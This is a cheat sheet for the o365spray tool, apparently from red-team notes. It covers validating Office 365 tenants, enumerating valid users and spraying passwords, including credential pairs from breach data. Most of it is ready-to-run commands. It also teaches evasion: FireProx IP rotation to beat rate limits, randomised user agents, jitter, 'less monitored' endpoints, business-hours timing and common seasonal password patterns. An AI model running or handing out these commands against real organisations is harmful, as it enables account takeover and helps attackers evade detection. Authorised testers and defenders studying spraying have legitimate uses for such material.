# o365spray

**Type:** Python Tool
**Purpose:** Office 365 username enumeration and password spraying
**Platform:** Windows, Linux, macOS
**Tags:** #o365 #enumeration #password-spray #initial-access #python #user-enum #auth

---

## Installation & Setup

```bash
# Install via pip
pip install o365spray

# Or clone from GitHub
git clone https://github.com/0xZDH/o365spray.git
cd o365spray
pip install -r requirements.txt
python3 setup.py install

# Verify installation
o365spray --version
```

---

## Quick Reference (Most Common Commands)

```bash
# Validate O365 domain
o365spray --validate --domain company.com

# Enumerate users
o365spray --enum -U users.txt --domain company.com

# Password spray
o365spray --spray -U valid-users.txt -p 'Password123!' --count 1 --lockout 15 --domain company.com

# Password spray with multiple passwords
o365spray --spray -U users.txt -P passwords.txt --count 2 --lockout 5 --domain company.com

# Spray with user:password pairs
o365spray --spray --paired creds.txt --domain company.com
```

---

## RECON: Domain Validation

### RECON: Validate O365 Tenant
**Use Case:** Check if domain uses Office 365

```bash
# Default getuserrealm module
o365spray --validate --domain company.com

# Shows:
# - If domain uses O365
# - Federation status (federated vs managed)
# - Tenant brand name
# - Authentication URL

# Custom module
o365spray --validate --domain company.com --validate-module getuserrealm
```

---

## ENUM: Username Enumeration

### ENUM: Office Module (Default)
**Use Case:** Enumerate valid Office 365 users

```bash
# Basic enumeration
o365spray --enum -U usernames.txt --domain company.com

# Office module (default)
o365spray --enum -U users.txt --domain company.com --enum-module office

# Single username
o365spray --enum -u "john.doe" --domain company.com
o365spray --enum -u "john.doe@company.com" --domain company.com

# Multiple usernames (comma separated)
o365spray --enum -u "user1,user2,user3" --domain company.com
```

### ENUM: OAuth2 Module
**Use Case:** Enumerate via OAuth2 endpoint

```bash
# OAuth2 module
o365spray --enum -U users.txt --domain company.com --enum-module oauth2

# WARNING: Submits authentication attempt per user
# May trigger lockout if used with password spraying
```

### ENUM: OneDrive Module
**Use Case:** Enumerate users via OneDrive

```bash
# OneDrive enumeration
o365spray --enum -U users.txt --domain company.com --enum-module onedrive

# NOTE: Only detects users who have logged into OneDrive before
# Users who haven't used OneDrive will show as invalid
```

### ENUM: Autologon Module
**Use Case:** Enumerate via autologon endpoint

```bash
# Autologon module
o365spray --enum -U users.txt --domain company.com --enum-module autologon

# WARNING: Submits authentication attempt
# Consider lockout policy
```

### ENUM: RST Module
**Use Case:** Enumerate via RST (Request Security Token)

```bash
# RST enumeration
o365spray --enum -U users.txt --domain company.com --enum-module rst

# WARNING: Submits authentication attempt
# May impact lockout timer
```

---

## CRED: Password Spraying

### CRED: Basic Password Spray
**Use Case:** Spray single password against user list

```bash
# Single password
o365spray --spray -U valid-users.txt -p 'Summer2024!' --count 1 --lockout 15 --domain company.com

# Default oauth2 module
o365spray --spray -U users.txt -p 'Password123!' --domain company.com

# Output results to directory
o365spray --spray -U users.txt -p 'Password1' --output ./results --domain company.com
```

### CRED: Multiple Passwords
**Use Case:** Spray multiple passwords with lockout awareness

```bash
# Password file
o365spray --spray -U users.txt -P passwords.txt --count 2 --lockout 5 --domain company.com

# Comma-separated passwords
o365spray --spray -U users.txt -p 'Pass1,Pass2,Pass3' --count 3 --lockout 10 --domain company.com

# --count: number of passwords to try before waiting for lockout reset
# --lockout: minutes to wait between spray cycles
```

### CRED: Paired Credentials
**Use Case:** Test username:password pairs (e.g., from breach data)

```bash
# Format: username:password (one per line)
o365spray --spray --paired credentials.txt --domain company.com

# Example credentials.txt:
# john@company.com:Password123
# jane@company.com:Summer2024!
# admin@company.com:CompanyName1
```

### CRED: ActiveSync Module
**Use Case:** Spray via ActiveSync (Exchange)

```bash
# ActiveSync spray
o365spray --spray -U users.txt -p 'Password1' --spray-module activesync --domain company.com

# More stealthy, different logs than oauth2
```

### CRED: Autodiscover Module
**Use Case:** Spray via Autodiscover endpoint

```bash
# Autodiscover spray
o365spray --spray -U users.txt -p 'Password1' --spray-module autodiscover --domain company.com
```

### CRED: Reporting Module
**Use Case:** Spray via Office 365 Reporting API

```bash
# Reporting API spray
o365spray --spray -U users.txt -p 'Password1' --spray-module reporting --domain company.com

# Different endpoint, may evade some detections
```

### CRED: ADFS Spray
**Use Case:** Spray federated ADFS endpoint

```bash
# ADFS password spraying
o365spray --spray -U users.txt -p 'Password1' --spray-module adfs --adfs-url https://adfs.company.com/adfs/ls/ --domain company.com

# For federated tenants
# Get ADFS URL from validation output
```

### CRED: Autologon Spray
**Use Case:** Spray via autologon endpoint

```bash
# Autologon spray
o365spray --spray -U users.txt -p 'Password1' --spray-module autologon --domain company.com
```

### CRED: RST Spray
**Use Case:** Spray via Request Security Token

```bash
# RST spray
o365spray --spray -U users.txt -p 'Password1' --spray-module rst --domain company.com
```

---

## Rate Limiting & Evasion

### Rate Limiting Configuration
**Use Case:** Control request rate to avoid detection

```bash
# Delay between requests (seconds)
o365spray --spray -U users.txt -p 'Password1' --sleep 5 --domain company.com

# Random delay (1 sec - 2 min)
o365spray --spray -U users.txt -p 'Password1' --sleep -1 --domain company.com

# Add jitter (percentage of sleep time)
o365spray --spray -U users.txt -p 'Password1' --sleep 5 --jitter 50 --domain company.com

# Concurrent connections
o365spray --spray -U users.txt -p 'Password1' --rate 5 --domain company.com
# Default: 10 concurrent
```

### User Agent Randomization
**Use Case:** Randomize user agents to blend in

```bash
# User agent file (4,800+ agents included)
o365spray --spray -U users.txt -p 'Password1' --useragents resc/user-agents.txt --domain company.com

# Custom user agent file
o365spray --spray -U users.txt -p 'Password1' --useragents my-agents.txt --domain company.com
```

### Proxy Configuration
**Use Case:** Route traffic through proxy

```bash
# HTTP/HTTPS proxy
o365spray --spray -U users.txt -p 'Password1' --proxy http://127.0.0.1:8080 --domain company.com

# SOCKS proxy
o365spray --spray -U users.txt -p 'Password1' --proxy socks5://127.0.0.1:1080 --domain company.com
```

---

## FireProx Integration

### FireProx Setup
**Use Case:** Bypass IP-based rate limiting with AWS API Gateway

```bash
# Create FireProx URL for oauth2 enumeration
fireprox --command create --url https://login.microsoftonline.com/

# Use FireProx URL with o365spray
o365spray --enum -U users.txt --domain company.com --enum-module oauth2 --proxy-url https://abc123.execute-api.us-east-1.amazonaws.com/fireprox/

# Create FireProx for ActiveSync spray
fireprox --command create --url https://outlook.office365.com/

# Spray via FireProx
o365spray --spray -U users.txt -p 'Password1' --spray-module activesync --proxy-url https://xyz789.execute-api.us-east-1.amazonaws.com/fireprox/ --domain company.com
```

### FireProx Base URLs by Module

**Enumeration Modules:**
```
autodiscover: https://outlook.office365.com/
autologon:    https://autologon.microsoftazuread-sso.com/
oauth2:       https://login.microsoftonline.com/
office:       https://login.microsoftonline.com/
rst:          https://login.microsoftonline.com/
onedrive:     https://<tenant>-my.sharepoint.com/
```

**Spray Modules:**
```
activesync:   https://outlook.office365.com/
autodiscover: https://autodiscover-s.outlook.com/
autologon:    https://autologon.microsoftazuread-sso.com/
oauth2:       https://login.microsoftonline.com/
reporting:    https://reports.office365.com/
rst:          https://login.microsoftonline.com/
```

---

## Safety & Lockout Protection

### Lockout Safety Features
**Use Case:** Prevent mass account lockouts

```bash
# Safe mode: terminate if N locked accounts detected
o365spray --spray -U users.txt -p 'Password1' --safe 5 --domain company.com
# Default: 10 locked accounts

# Lockout policy configuration
o365spray --spray -U users.txt -P passwords.txt --count 2 --lockout 30 --domain company.com
# --count 2: Try 2 passwords before reset
# --lockout 30: Wait 30 minutes between cycles

# Example: 3 passwords, 15 min lockout
o365spray --spray -U users.txt -p 'Pass1,Pass2,Pass3' --count 3 --lockout 15 --domain company.com
```

---

## Output & Logging

### Output Configuration
**Use Case:** Save results and valid credentials

```bash
# Specify output directory
o365spray --spray -U users.txt -p 'Password1' --output ./results/ --domain company.com

# Creates files:
# - enum/valid_users.txt (valid users)
# - spray/valid_credentials.txt (valid creds)
# - spray/tested_logins.txt (all attempts)

# Default: current directory
```

### Debug Mode
**Use Case:** Troubleshoot issues

```bash
# Enable debug output
o365spray --spray -U users.txt -p 'Password1' --debug --domain company.com

# Shows detailed HTTP requests/responses
```

---

## Attack Patterns

### Pattern: Validate → Enumerate → Spray
```bash
# 1. Validate target domain
o365spray --validate --domain company.com

# 2. Enumerate valid users
o365spray --enum -U potential-users.txt --domain company.com --output ./results/

# 3. Use valid users for spraying
o365spray --spray -U ./results/enum/valid_users.txt -p 'SeasonYear!' --count 1 --lockout 15 --domain company.com --output ./results/
```

### Pattern: Multi-Password Spray with Lockout Awareness
```bash
# Common password list
cat > passwords.txt << EOF
Password123!
Summer2024!
Fall2024!
Winter2024!
Company2024!
EOF

# Spray: 2 passwords every 30 minutes
# (Conservative approach)
o365spray --spray -U valid-users.txt -P passwords.txt --count 2 --lockout 30 --sleep 5 --domain company.com
```

### Pattern: Stealth Spray with FireProx & Random User Agents
```bash
# 1. Setup FireProx
fireprox --command create --url https://login.microsoftonline.com/
# Note the API Gateway URL

# 2. Spray with evasion techniques
o365spray --spray \
  -U valid-users.txt \
  -p 'Password123!' \
  --spray-module oauth2 \
  --proxy-url https://xyz.execute-api.us-east-1.amazonaws.com/fireprox/ \
  --useragents resc/user-agents.txt \
  --sleep -1 \
  --jitter 50 \
  --rate 3 \
  --domain company.com
```

### Pattern: Breach Data Validation
```bash
# Test username:password pairs from breach
o365spray --spray --paired breach-creds.txt --domain company.com

# If successful, user may be reusing leaked passwords
```

---

## Module Selection Guide

### When to Use Each Enumeration Module

**office (Default)** - Recommended
- No authentication attempt
- Fast and reliable
- Minimal risk

**oauth2** - Use with caution
- Submits auth attempt per user
- Can trigger lockout
- Reset lockout timer before spraying

**onedrive** - Specific use case
- Only works for users who've used OneDrive
- May miss valid users

**autologon / rst** - High risk
- Submits auth attempts
- Risk of lockout
- Use sparingly

### When to Use Each Spray Module

**oauth2 (Default)** - General purpose
- Works for managed (cloud-only) tenants
- NOT for federated tenants (unless password sync enabled)
- Most common

**activesync** - Alternative
- Different endpoint
- Different logs
- Good for evasion

**reporting** - Evasion
- Office 365 Reporting API
- Less monitored endpoint
- Alternative logging

**autodiscover** - Exchange focus
- Exchange/Outlook specific
- Another alternative endpoint

**adfs** - Federated tenants
- Required for federated domains
- Targets on-prem ADFS
- Need ADFS URL

**autologon / rst** - Advanced
- Alternative authentication flows
- Use for specific scenarios

---

## Pro Tips

💡 **Lockout Policy**: Most O365 tenants: 10 attempts in 15 minutes
💡 **Enumeration First**: Always enumerate before spraying (don't waste attempts on invalid users)
💡 **Module Selection**: Use 'office' module for enum (no auth attempt)
💡 **FireProx**: Essential for large-scale sprays (bypasses IP rate limiting)
💡 **User Agents**: Randomize to blend in with legit traffic
💡 **Safe Mode**: Use `--safe` to auto-terminate on lockouts
💡 **Timing**: Spray during business hours (less suspicious)
💡 **Password Patterns**: SeasonYear! format common (Summer2024!, Fall2024!)
💡 **Output Dirs**: Save results for future reference
💡 **Federated**: Check federation status - affects module choice

---

## OPSEC Considerations

⚠️ **High Risk:**
- oauth2/autologon/rst enumeration (auth attempts)
- Rapid spraying without delays
- Spraying from single IP
- Using suspicious/repeated user agents
- Exceeding lockout threshold

⚠️ **Medium Risk:**
- Large-scale enumeration
- Spraying outside business hours
- Multiple spray cycles in short time
- Common password patterns

✅ **Lower Risk:**
- 'office' module enumeration (no auth)
- Long delays between attempts (--sleep)
- FireProx for IP rotation
- Random user agents
- Low concurrent rate (--rate 3-5)
- Conservative --count and --lockout values
- Spraying during business hours
- Using breach data (targeted approach)

**Detection Vectors:**
- Failed login attempts from single IP
- Unusual authentication patterns
- Failed logins for many users simultaneously
- Authentication from unexpected geos
- Repeated user agent strings
- Azure AD sign-in logs
- Smart lockout triggers

---

## Resources

- GitHub: https://github.com/0xZDH/o365spray
- User Agents: resc/user-agents.txt (4,800+ agents)
- FireProx: https://github.com/ustayready/fireprox
- Omnispray (successor): https://github.com/0xZDH/Omnispray
- Author: @0xZDH
